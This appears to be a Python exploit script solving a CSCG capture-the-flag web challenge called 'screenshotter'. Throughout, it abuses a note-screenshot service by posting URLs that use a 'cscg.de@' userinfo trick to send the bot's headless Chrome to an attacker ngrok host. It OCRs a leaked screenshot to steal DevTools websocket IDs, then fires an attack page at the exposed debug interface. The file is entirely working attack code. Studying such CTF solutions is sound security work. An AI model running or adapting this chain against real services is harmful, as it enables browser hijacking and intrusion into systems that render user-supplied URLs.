try:
    from PIL import Image
except ImportError:
    import Image
import pytesseract

import re
import requests
import base64
import time
from datetime import datetime
from logzero import logger

SCREENSHOTTER = 'http://127.0.0.1:5000'
NGROK_DOMAIN = 'f4b2152b6973.ngrok.io'

while True:
    logger.info('')
    logger.info(f'SCREENSHOTTER EXPLOIT')
    s = requests.Session()

    s.post(f'{SCREENSHOTTER}/registerlogin', data={'username': 'fabian', 'password':'fabian'})
    CHROME_IP = None
    while not CHROME_IP:
        js = s.get(f'{SCREENSHOTTER}/activity.json').json()
        for j in js:
            logger.info(j['msg'])
            if 'chrome:' in j['msg']:
                CHROME_IP = base64.b64decode(j['msg'].split('chrome:')[1]+"===").decode('ascii')
        

    logger.info(f'got chrome IP: {CHROME_IP}')


    GOOD_TIME = False
    while not GOOD_TIME:
        js = s.get(f'{SCREENSHOTTER}/activity.json').json()
        j = js[0]
        if 'flagger deleted a note' in j['msg']:
            now = datetime.utcnow()
            diff = now - datetime.strptime(j['timestamp'], '%Y-%m-%d %H:%M:%S')
            if diff.seconds < 3:
                GOOD_TIME = True
                break
        logger.info(f"waiting for the right moment: `{j['msg']}`")
        time.sleep(1)
    
    logger.info('saw trigger. now wait 30s')
    time.sleep(30)
    logger.info('post leak shot!')
    s.post(f'{SCREENSHOTTER}/add_note', data={'body': f'http://cscg.de@{NGROK_DOMAIN}/index.html?{CHROME_IP}', 'title':''})

    now = datetime.now()

    GOT_SCREENSHOT = False
    while not GOT_SCREENSHOT:

        js = s.get(f'{SCREENSHOTTER}/notes.json').json()
        j = js[0]
        if "processing screenshot..." not in j['title']:
            logger.info('found screenshot')
            screenshot = base64.b64decode(j['data'].split('data:image/png;base64,')[1])
            with open('shot.png', 'wb') as f:
                f.write(screenshot)
            GOT_SCREENSHOT = pytesseract.image_to_string('shot.png')
            break
        logger.info(f"waiting for screenshot: `{j['title']}`")
        time.sleep(1)

    r = re.compile('/devtools/page/([A-Z0-9]{32})')
    logger.info(f"OCR the screenshot: `{GOT_SCREENSHOT}`")
    wss = r.findall(GOT_SCREENSHOT)
    logger.info(f'got ws? {wss}')

    if len(wss)==0:
        logger.error("couldn't find ws ID")
        continue

    TARGET = f"http://cscg.de@{NGROK_DOMAIN}/attack.html?{CHROME_IP},{','.join(wss)}"

    logger.info(f'attack target: `{TARGET}`')

    s.post(f'{SCREENSHOTTER}/add_note', data={'body': TARGET, 'title':''})

    logger.info('triggered attack!')
    exit(0)